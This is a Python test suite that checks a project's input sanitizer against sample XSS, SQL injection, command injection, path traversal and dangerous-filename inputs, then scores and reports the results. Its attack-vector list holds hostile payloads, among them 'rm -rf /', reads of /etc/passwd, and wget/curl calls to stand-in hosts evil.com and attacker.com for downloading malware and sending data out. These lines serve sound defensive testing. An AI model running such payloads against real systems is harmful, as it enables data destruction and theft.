#!/usr/bin/env python3
"""
Input Sanitization Validation Suite
===================================

Comprehensive validation suite for the production input sanitization system.
Tests various attack vectors and ensures the sanitizer properly blocks
malicious input while preserving legitimate data.

This validator tests:
- XSS attack prevention
- SQL injection prevention  
- Command injection prevention
- Path traversal prevention
- File upload security
- FTNS transaction validation
- Performance under load
"""

import asyncio
import json
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Any, Tuple
import structlog

# Import the production sanitizer
try:
    from prsm.security.production_input_sanitization import (
        ProductionInputSanitizer,
        SanitizationContext,
        SanitizationLevel,
        SecurityViolation,
        get_input_sanitizer,
        sanitize_input
    )
    SANITIZER_AVAILABLE = True
except ImportError as e:
    print(f"⚠️ Could not import sanitizer: {e}")
    SANITIZER_AVAILABLE = False

logger = structlog.get_logger(__name__)

class InputSanitizationValidator:
    """Comprehensive input sanitization validation"""
    
    def __init__(self):
        self.project_root = Path(__file__).parent.parent
        self.results_dir = self.project_root / "security-validation-results"
        self.results_dir.mkdir(exist_ok=True)
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Test attack vectors
        self.attack_vectors = {
            "xss_attacks": [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<iframe src=\"javascript:alert('XSS')\"></iframe>",
                "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
                "<svg onload=alert('XSS')>",
                "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            ],
            "sql_injection": [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "UNION SELECT * FROM users",
                "'; INSERT INTO users VALUES ('hacker', 'password'); --",
                "1; DELETE FROM users WHERE id=1; --",
                "' OR 1=1 --",
                "admin'--",
                "' UNION SELECT NULL,username,password FROM users--",
            ],
            "command_injection": [
                "; ls -la",
                "| cat /etc/passwd",
                "`whoami`",
                "$(ls)",
                "&& rm -rf /",
                "; wget http://evil.com/malware",
                "| curl http://attacker.com/steal?data=",
                "; python -c \"import os; os.system('ls')\"",
            ],
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc//passwd",
                "/var/www/../../etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
            ],
            "malicious_filenames": [
                "../../../evil.php",
                "virus.exe",
                "malware.bat",
                "script.sh",
                "backdoor.jsp",
                "shell.php",
                "payload.ps1",
                "exploit.vbs",
            ],
            "legitimate_inputs": [
                "Hello, world!",
                "user@example.com",
                "This is a normal sentence with punctuation.",
                "Product Name: Widget 2000",
                "Price: $19.99",
                "Quantity: 5",
                "https://example.com/api/endpoint",
                "123.456789",
            ]
        }
    
    async def run_validation_suite(self):
        """Run comprehensive input sanitization validation"""
        if not SANITIZER_AVAILABLE:
            logger.error("❌ Input sanitizer not available - skipping validation")
            return {"status": "skipped", "reason": "sanitizer_not_available"}
        
        logger.info("🛡️ Starting Input Sanitization Validation Suite")
        logger.info("=" * 60)
        
        validation_results = {
            "validation_suite": "PRSM Input Sanitization Validation",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "test_categories": {},
            "performance_tests": {},
            "summary": {}
        }
        
        # Test categories
        test_categories = [
            ("xss_protection", self._test_xss_protection),
            ("sql_injection_protection", self._test_sql_injection_protection),
            ("command_injection_protection", self._test_command_injection_protection),
            ("path_traversal_protection", self._test_path_traversal_protection),
            ("file_upload_security", self._test_file_upload_security),
            ("ftns_transaction_validation", self._test_ftns_transaction_validation),
            ("legitimate_input_preservation", self._test_legitimate_input_preservation),
        ]
        
        # Execute test categories
        for category_name, test_function in test_categories:
            logger.info(f"🔍 Testing {category_name}...")
            
            start_time = time.time()
            try:
                result = await test_function()
                execution_time = time.time() - start_time
                
                validation_results["test_categories"][category_name] = {
                    "status": "completed",
                    "execution_time": execution_time,
                    "results": result,
                    "timestamp": datetime.now(timezone.utc).isoformat()
                }
                
                success_rate = (result.get("blocked_attacks", 0) / max(1, result.get("total_tests", 1))) * 100
                logger.info(f"✅ {category_name}: {success_rate:.1f}% success rate")
                
            except Exception as e:
                execution_time = time.time() - start_time
                validation_results["test_categories"][category_name] = {
                    "status": "failed",
                    "execution_time": execution_time,
                    "error": str(e),
                    "timestamp": datetime.now(timezone.utc).isoformat()
                }
                logger.error(f"❌ {category_name}: Failed - {e}")
        
        # Performance tests
        validation_results["performance_tests"] = await self._test_performance()
        
        # Generate summary
        validation_results["summary"] = self._generate_validation_summary(validation_results)
        
        # Save results
        await self._save_validation_results(validation_results)
        
        return validation_results
    
    async def _test_xss_protection(self) -> Dict[str, Any]:
        """Test XSS attack protection"""
        sanitizer = get_input_sanitizer()
        blocked_attacks = 0
        total_tests = len(self.attack_vectors["xss_attacks"])
        test_details = []
        
        for attack in self.attack_vectors["xss_attacks"]:
            try:
                # Test in API input context
                result = sanitizer.sanitize(attack, SanitizationContext.API_INPUT)
                
                # Check if attack was neutralized
                if "<script" not in result.lower() and "javascript:" not in result.lower() and "onerror=" not in result.lower():
                    blocked_attacks += 1
                    test_details.append({"attack": attack[:50], "status": "blocked", "result": result[:100]})
                else:
                    test_details.append({"attack": attack[:50], "status": "not_blocked", "result": result[:100]})
                    
            except SecurityViolation:
                # SecurityViolation is the expected behavior for attacks
                blocked_attacks += 1
                test_details.append({"attack": attack[:50], "status": "blocked_with_exception", "result": "SecurityViolation raised"})
            except Exception as e:
                test_details.append({"attack": attack[:50], "status": "error", "result": str(e)})
        
        return {
            "total_tests": total_tests,
            "blocked_attacks": blocked_attacks,
            "success_rate": (blocked_attacks / total_tests) * 100,
            "test_details": test_details
        }
    
    async def _test_sql_injection_protection(self) -> Dict[str, Any]:
        """Test SQL injection attack protection"""
        sanitizer = get_input_sanitizer()
        blocked_attacks = 0
        total_tests = len(self.attack_vectors["sql_injection"])
        test_details = []
        
        for attack in self.attack_vectors["sql_injection"]:
            try:
                # Test in database query context
                result = sanitizer.sanitize(attack, SanitizationContext.DATABASE_QUERY)
                
                # Check if SQL injection was neutralized
                dangerous_patterns = ["drop table", "union select", "delete from", "insert into"]
                if not any(pattern in result.lower() for pattern in dangerous_patterns):
                    blocked_attacks += 1
                    test_details.append({"attack": attack[:50], "status": "blocked", "result": result[:100]})
                else:
                    test_details.append({"attack": attack[:50], "status": "not_blocked", "result": result[:100]})
                    
            except SecurityViolation:
                blocked_attacks += 1
                test_details.append({"attack": attack[:50], "status": "blocked_with_exception", "result": "SecurityViolation raised"})
            except Exception as e:
                test_details.append({"attack": attack[:50], "status": "error", "result": str(e)})
        
        return {
            "total_tests": total_tests,
            "blocked_attacks": blocked_attacks,
            "success_rate": (blocked_attacks / total_tests) * 100,
            "test_details": test_details
        }
    
    async def _test_command_injection_protection(self) -> Dict[str, Any]:
        """Test command injection attack protection"""
        sanitizer = get_input_sanitizer()
        blocked_attacks = 0
        total_tests = len(self.attack_vectors["command_injection"])
        test_details = []
        
        for attack in self.attack_vectors["command_injection"]:
            try:
                # Test in system command context
                result = sanitizer.sanitize(attack, SanitizationContext.SYSTEM_COMMAND)
                
                # Should always raise SecurityViolation for system commands
                test_details.append({"attack": attack[:50], "status": "not_blocked", "result": result[:100]})
                
            except SecurityViolation:
                blocked_attacks += 1
                test_details.append({"attack": attack[:50], "status": "blocked_with_exception", "result": "SecurityViolation raised"})
            except Exception as e:
                test_details.append({"attack": attack[:50], "status": "error", "result": str(e)})
        
        return {
            "total_tests": total_tests,
            "blocked_attacks": blocked_attacks,
            "success_rate": (blocked_attacks / total_tests) * 100,
            "test_details": test_details
        }
    
    async def _test_path_traversal_protection(self) -> Dict[str, Any]:
        """Test path traversal attack protection"""
        sanitizer = get_input_sanitizer()
        blocked_attacks = 0
        total_tests = len(self.attack_vectors["path_traversal"])
        test_details = []
        
        for attack in self.attack_vectors["path_traversal"]:
            try:
                # Test in file upload context
                file_data = {"filename": attack, "content": b"test content"}
                result = sanitizer.sanitize(file_data, SanitizationContext.FILE_UPLOAD)
                
                # Check if path traversal was neutralized
                if "../" not in result.get("filename", "") and "..\\" not in result.get("filename", ""):
                    blocked_attacks += 1
                    test_details.append({"attack": attack[:50], "status": "blocked", "result": result.get("filename", "")[:100]})
                else:
                    test_details.append({"attack": attack[:50], "status": "not_blocked", "result": result.get("filename", "")[:100]})
                    
            except SecurityViolation:
                blocked_attacks += 1
                test_details.append({"attack": attack[:50], "status": "blocked_with_exception", "result": "SecurityViolation raised"})
            except Exception as e:
                test_details.append({"attack": attack[:50], "status": "error", "result": str(e)})
        
        return {
            "total_tests": total_tests,
            "blocked_attacks": blocked_attacks,
            "success_rate": (blocked_attacks / total_tests) * 100,
            "test_details": test_details
        }
    
    async def _test_file_upload_security(self) -> Dict[str, Any]:
        """Test file upload security"""
        sanitizer = get_input_sanitizer()
        blocked_attacks = 0
        total_tests = len(self.attack_vectors["malicious_filenames"])
        test_details = []
        
        for malicious_filename in self.attack_vectors["malicious_filenames"]:
            try:
                file_data = {"filename": malicious_filename, "content": b"malicious content"}
                result = sanitizer.sanitize(file_data, SanitizationContext.FILE_UPLOAD)
                
                # Check if malicious file was blocked
                original_ext = Path(malicious_filename).suffix.lower()
                if original_ext in ['.exe', '.bat', '.sh', '.php', '.jsp', '.ps1', '.vbs']:
                    # Should be blocked
                    test_details.append({"attack": malicious_filename, "status": "not_blocked", "result": "Dangerous file allowed"})
                else:
                    blocked_attacks += 1
                    test_details.append({"attack": malicious_filename, "status": "blocked", "result": "File processed safely"})
                    
            except SecurityViolation:
                blocked_attacks += 1
                test_details.append({"attack": malicious_filename, "status": "blocked_with_exception", "result": "SecurityViolation raised"})
            except Exception as e:
                test_details.append({"attack": malicious_filename, "status": "error", "result": str(e)})
        
        return {
            "total_tests": total_tests,
            "blocked_attacks": blocked_attacks,
            "success_rate": (blocked_attacks / total_tests) * 100,
            "test_details": test_details
        }
    
    async def _test_ftns_transaction_validation(self) -> Dict[str, Any]:
        """Test FTNS transaction validation"""
        sanitizer = get_input_sanitizer()
        successful_validations = 0
        test_cases = [
            {"amount": "123.456789", "recipient": "user123", "description": "Payment"},
            {"amount": 100.0, "recipient": "user456", "description": "Refund"},
            {"amount": "invalid", "recipient": "user789", "description": "Bad amount"},
            {"amount": "999.123456789012345678901", "recipient": "user000", "description": "Too many decimals"},
            {"amount": "<script>alert('xss')</script>", "recipient": "user111", "description": "XSS attempt"},
        ]
        
        test_details = []
        total_tests = len(test_cases)
        
        for i, transaction in enumerate(test_cases):
            try:
                result = sanitizer.sanitize(transaction, SanitizationContext.FTNS_TRANSACTION)
                
                # Check if valid transactions pass and invalid ones are blocked
                if i < 2:  # First two should pass
                    successful_validations += 1
                    test_details.append({"transaction": transaction, "status": "valid", "result": str(result)[:100]})
                else:  # Others should be blocked or sanitized
                    if result != transaction:  # Data was modified (sanitized)
                        successful_validations += 1
                        test_details.append({"transaction": transaction, "status": "sanitized", "result": str(result)[:100]})
                    else:
                        test_details.append({"transaction": transaction, "status": "not_sanitized", "result": str(result)[:100]})
                
            except SecurityViolation:
                if i >= 2:  # Invalid transactions should raise violations
                    successful_validations += 1
                    test_details.append({"transaction": transaction, "status": "blocked_with_exception", "result": "SecurityViolation raised"})
                else:
                    test_details.append({"transaction": transaction, "status": "false_positive", "result": "Valid transaction blocked"})
            except Exception as e:
                test_details.append({"transaction": transaction, "status": "error", "result": str(e)})
        
        return {
            "total_tests": total_tests,
            "successful_validations": successful_validations,
            "success_rate": (successful_validations / total_tests) * 100,
            "test_details": test_details
        }
    
    async def _test_legitimate_input_preservation(self) -> Dict[str, Any]:
        """Test that legitimate inputs are preserved"""
        sanitizer = get_input_sanitizer()
        preserved_inputs = 0
        total_tests = len(self.attack_vectors["legitimate_inputs"])
        test_details = []
        
        for legitimate_input in self.attack_vectors["legitimate_inputs"]:
            try:
                result = sanitizer.sanitize(legitimate_input, SanitizationContext.API_INPUT)
                
                # Check if legitimate input was preserved (allowing for HTML encoding)
                import html
                expected_encoded = html.escape(legitimate_input, quote=True)
                
                if result == legitimate_input or result == expected_encoded:
                    preserved_inputs += 1
                    test_details.append({"input": legitimate_input, "status": "preserved", "result": result})
                else:
                    test_details.append({"input": legitimate_input, "status": "modified", "result": result})
                    
            except SecurityViolation:
                test_details.append({"input": legitimate_input, "status": "false_positive", "result": "Legitimate input blocked"})
            except Exception as e:
                test_details.append({"input": legitimate_input, "status": "error", "result": str(e)})
        
        return {
            "total_tests": total_tests,
            "preserved_inputs": preserved_inputs,
            "success_rate": (preserved_inputs / total_tests) * 100,
            "test_details": test_details
        }
    
    async def _test_performance(self) -> Dict[str, Any]:
        """Test sanitization performance"""
        sanitizer = get_input_sanitizer()
        
        # Test performance with different input sizes
        test_inputs = [
            "x" * 100,      # Small input
            "x" * 1000,     # Medium input  
            "x" * 10000,    # Large input
            "x" * 100000,   # Very large input
        ]
        
        performance_results = {}
        
        for i, test_input in enumerate(test_inputs):
            input_size = len(test_input)
            iterations = max(1, 1000 // (i + 1))  # Fewer iterations for larger inputs
            
            start_time = time.time()
            
            for _ in range(iterations):
                try:
                    sanitizer.sanitize(test_input, SanitizationContext.API_INPUT)
                except:
                    pass  # Ignore errors for performance testing
            
            total_time = time.time() - start_time
            avg_time = total_time / iterations
            
            performance_results[f"input_size_{input_size}"] = {
                "input_size_bytes": input_size,
                "iterations": iterations,
                "total_time_seconds": total_time,
                "average_time_ms": avg_time * 1000,
                "throughput_ops_per_second": iterations / total_time if total_time > 0 else 0
            }
        
        return performance_results
    
    def _generate_validation_summary(self, validation_results: Dict) -> Dict[str, Any]:
        """Generate validation summary"""
        total_categories = len(validation_results["test_categories"])
        successful_categories = len([cat for cat in validation_results["test_categories"].values() if cat["status"] == "completed"])
        
        # Calculate overall success rate
        success_rates = []
        for category_result in validation_results["test_categories"].values():
            if category_result["status"] == "completed":
                results = category_result["results"]
                if "success_rate" in results:
                    success_rates.append(results["success_rate"])
        
        overall_success_rate = sum(success_rates) / len(success_rates) if success_rates else 0
        
        # Determine security grade
        if overall_success_rate >= 95:
            security_grade = "A"
            security_status = "Excellent"
        elif overall_success_rate >= 85:
            security_grade = "B"
            security_status = "Good"
        elif overall_success_rate >= 75:
            security_grade = "C"
            security_status = "Acceptable"
        else:
            security_grade = "D"
            security_status = "Needs Improvement"
        
        return {
            "total_test_categories": total_categories,
            "successful_categories": successful_categories,
            "overall_success_rate": round(overall_success_rate, 1),
            "security_grade": security_grade,
            "security_status": security_status,
            "recommendation": self._generate_recommendations(overall_success_rate, validation_results)
        }
    
    def _generate_recommendations(self, success_rate: float, validation_results: Dict) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        if success_rate < 90:
            recommendations.append("Review and strengthen input sanitization rules")
        
        if success_rate < 80:
            recommendations.append("Consider additional security layers (WAF, IDS)")
            recommendations.append("Implement comprehensive security monitoring")
        
        # Check specific categories for targeted recommendations
        for category, result in validation_results["test_categories"].items():
            if result["status"] == "completed" and result["results"].get("success_rate", 0) < 90:
                recommendations.append(f"Improve {category.replace('_', ' ')} protection")
        
        if success_rate >= 95:
            recommendations.append("Input sanitization is enterprise-ready")
            recommendations.append("Consider implementing additional advanced threat protection")
        
        return recommendations
    
    async def _save_validation_results(self, validation_results: Dict):
        """Save validation results"""
        results_file = self.results_dir / f"input_sanitization_validation_{self.timestamp}.json"
        
        with open(results_file, 'w') as f:
            json.dump(validation_results, f, indent=2)
        
        # Generate summary report
        summary_file = self.results_dir / f"input_sanitization_summary_{self.timestamp}.md"
        with open(summary_file, 'w') as f:
            f.write(self._generate_summary_report(validation_results))
        
        logger.info(f"📄 Validation results saved: {results_file}")
        logger.info(f"📋 Summary report saved: {summary_file}")
    
    def _generate_summary_report(self, validation_results: Dict) -> str:
        """Generate human-readable summary report"""
        summary = validation_results["summary"]
        
        report = f"""# Input Sanitization Validation Report
Generated: {validation_results["timestamp"]}

## Executive Summary
- **Overall Success Rate**: {summary["overall_success_rate"]}%
- **Security Grade**: {summary["security_grade"]}
- **Security Status**: {summary["security_status"]}
- **Test Categories Completed**: {summary["successful_categories"]}/{summary["total_test_categories"]}

## Test Results by Category

"""
        
        for category, result in validation_results["test_categories"].items():
            status_icon = "✅" if result["status"] == "completed" else "❌"
            
            report += f"### {status_icon} {category.replace('_', ' ').title()}\n"
            
            if result["status"] == "completed":
                test_results = result["results"]
                success_rate = test_results.get("success_rate", 0)
                report += f"- Success Rate: {success_rate:.1f}%\n"
                report += f"- Tests Completed: {test_results.get('total_tests', 0)}\n"
                report += f"- Execution Time: {result['execution_time']:.3f}s\n"
            else:
                report += f"- Status: Failed\n"
                report += f"- Error: {result.get('error', 'Unknown')}\n"
            
            report += "\n"
        
        if "performance_tests" in validation_results:
            report += "## Performance Analysis\n\n"
            for test_name, perf_data in validation_results["performance_tests"].items():
                report += f"- **{test_name}**: {perf_data['average_time_ms']:.2f}ms avg, "
                report += f"{perf_data['throughput_ops_per_second']:.1f} ops/sec\n"
            report += "\n"
        
        report += "## Recommendations\n\n"
        for i, rec in enumerate(summary["recommendation"], 1):
            report += f"{i}. {rec}\n"
        
        report += f"""
## Conclusion
The input sanitization system achieved a {summary["overall_success_rate"]}% success rate 
with a security grade of {summary["security_grade"]}. This indicates {summary["security_status"].lower()} 
security posture for production deployment.

---
*This report was automatically generated by the PRSM Input Sanitization Validator*
"""
        
        return report


async def main():
    """Main function for input sanitization validation"""
    validator = InputSanitizationValidator()
    results = await validator.run_validation_suite()
    
    if results.get("status") == "skipped":
        logger.warning("⚠️ Validation skipped - input sanitizer not available")
        return
    
    summary = results["summary"]
    
    logger.info("\n" + "="*60)
    logger.info("🛡️ INPUT SANITIZATION VALIDATION COMPLETE")
    logger.info("="*60)
    logger.info(f"Overall Success Rate: {summary['overall_success_rate']}%")
    logger.info(f"Security Grade: {summary['security_grade']} ({summary['security_status']})")
    logger.info(f"Test Categories: {summary['successful_categories']}/{summary['total_test_categories']}")
    
    if summary["overall_success_rate"] >= 90:
        logger.info("🎉 Excellent input sanitization security!")
    elif summary["overall_success_rate"] >= 80:
        logger.info("✅ Good input sanitization security")
    else:
        logger.warning("⚠️ Input sanitization needs improvement")
    
    logger.info(f"\n📁 Results saved in: security-validation-results/")
    logger.info("🔒 Input sanitization security validated for production use")


if __name__ == "__main__":
    # Setup logging
    structlog.configure(
        processors=[
            structlog.stdlib.filter_by_level,
            structlog.stdlib.add_logger_name,
            structlog.stdlib.add_log_level,
            structlog.stdlib.PositionalArgumentsFormatter(),
            structlog.processors.TimeStamper(fmt="ISO"),
            structlog.processors.StackInfoRenderer(),
            structlog.processors.format_exc_info,
            structlog.processors.UnicodeDecoder(),
            structlog.processors.JSONRenderer()
        ],
        context_class=dict,
        logger_factory=structlog.stdlib.LoggerFactory(),
        wrapper_class=structlog.stdlib.BoundLogger,
        cache_logger_on_first_use=True,
    )
    
    # Run input sanitization validation
    asyncio.run(main())